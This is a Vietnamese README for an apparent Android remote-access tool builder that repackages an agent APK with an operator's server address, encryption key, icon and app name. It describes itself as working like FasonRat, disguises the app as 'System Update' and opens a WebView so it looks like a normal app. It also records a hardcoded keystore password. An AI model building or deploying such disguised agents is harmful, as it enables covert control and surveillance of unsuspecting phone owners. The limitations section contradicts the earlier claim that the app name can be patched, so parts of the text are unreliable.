# Builder APK trên panel (không cần Android SDK)

## Vì sao làm được

Trước đây config (host/port/psk) bị compile vào `Cfg.java` → mỗi lần đổi phải build lại APK bằng Gradle/SDK.
Giờ agent đọc `assets/zk.conf` lúc runtime, nên build = **thay 1 file trong ZIP rồi ký lại**.

| Bước | Công cụ | Ghi chú |
|---|---|---|
| 1. Đọc base APK | `ZipFile.OpenRead` | base nằm ở `server/builder/zk_base.apk` |
| 2. Thay `assets/zk.conf` (+ icon nếu có) | C# | bỏ META-INF cũ (v1 sẽ sai) |
| 3. Ghi ZIP mới | `Zip.cs` tự viết | mọi entry căn 4 byte, `resources.arsc` STORE (Android 11+ bắt buộc) |
| 4. Ký **v2** | `ApkSign.cs` tự viết | RSA-2048 PKCS#1 v1.5 SHA-256, block id `0x7109871a` |

Không cần JDK, apksigner, zipalign hay Android SDK trên VPS.

## Chi tiết kỹ thuật v2 (để thuyết trình)

- EOCD của APK cuối phải trỏ tới **Central Directory thật** (nằm sau signing block)
  → block được tìm bằng 24 byte ngay trước CD (`uint64 size` + `"APK Sig Block 42"`).
- Digest `CHUNKED_SHA256`: 3 section (entries, CD, EOCD), mỗi section cắt 1MB:
  `chunkDigest = SHA256(0xa5 ‖ uint32(len) ‖ chunk)`,
  `final = SHA256(0x5a ‖ uint32(nChunks) ‖ concat(chunkDigests))`.
- **EOCD dùng để tính digest có `cd_offset` = đầu block**, còn EOCD ghi ra file có `cd_offset` = CD thật.
  (Ban đầu tao dùng nhầm → apksigner báo `CHUNKED_SHA256 digest mismatch`; đây là chỗ dễ sai nhất.)
- `signed_data` = digests ‖ certs ‖ attrs, **ký trên chính bytes đó (không gồm 4 byte length prefix)**.
- Chữ ký RSA độ dài cố định (`keySize/8`) → dựng block 1 lần bằng chữ ký giả để biết `blockSize`,
  rồi mới tính EOCD + digest.
- `minSdkVersion` đổi 21 → **24** vì APK chỉ có v2 (Android 5/6 không hiểu v2).

## Ô nhập trong Builder (giống FasonRat)

| Ô | Ý nghĩa |
|---|---|
| **server url** | `http://IP_VPS:7878` hoặc `IP:7878` (tự thêm scheme, tự tách host/port) |
| **tên app** | tên hiện trên launcher — patch thẳng string pool trong `resources.arsc` |
| **home page** | URL app mở khi khởi động (WebView) để trông như app thường; để trống = mở màn hình cài đặt |
| **psk** | khoá mã hoá (dán từ `/etc/zekodroid.env`) |
| **icon** | PNG thay icon |

### Đổi tên app thế nào (arsc patch)

`resources.arsc` có 1 global **string pool** ở đầu file. Server:
1. đọc header pool (headerSize, stringCount, styleCount, flags UTF8/UTF16, stringsStart)
2. đọc toàn bộ string, tìm chuỗi `System Update`
3. thay bằng tên mới, dựng lại pool (offsets + data + styles) rồi **dịch toàn bộ phần sau pool**
4. cập nhật `pool size` và `ResTable size`

Kiểm chứng: `aapt2 dump badging` → `application-label:'Cloud Sync'`, `apksigner verify` → exit 0.

## API

```
GET  /api/builder/info                 → {ready, basePath}
POST /api/builder/build  {url | host+port, name?, home?, psk?, icon?}
     → APK (application/vnd.android.package-archive)
```

Build thật đo được: **42 ms** (server) — panel hiện `11 ms` tính cả mạng LAN.

## Kết quả kiểm chứng

```
apksigner verify  → exit 0
  Signer #1 certificate DN: CN=System Update, O=Zeko, C=VN
  SHA-256: 1fdc0e7228440a486f2525813b42b066715f914b50f964bbf9314833c993c707
aapt2 dump badging → package com.zeko.droid, minSdk 24, targetSdk 34
assets/zk.conf trong APK tải về:
  host=192.168.0.100
  port=7880
  psk=
  auto=1
```

## Dùng

1. Vào panel → nút **🐋 Builder** trên header.
2. Nhập host (IP VPS), port (7878), psk (nếu bật), chọn icon PNG nếu muốn.
3. Bấm **Build & tải APK** → file `ZekoDroid-<host>.apk` tải về.
4. `adb install -r ZekoDroid-<host>.apk`.

## Giới hạn

- **Không đổi được tên app** hiện trên launcher (tên nằm trong `resources.arsc`; sửa phải rebuild arsc).
  Muốn đổi tên thì build bằng `build.ps1` với `strings.xml`.
- Icon thì đổi được (thay `res/drawable/ic_launcher.png`).
- APK chỉ ký v2 → máy Android < 7 không cài được.
- Keystore nằm ở `server/builder/zeko.pfx` (pass `zeko123`) — giữ file này để update đè lên bản cũ.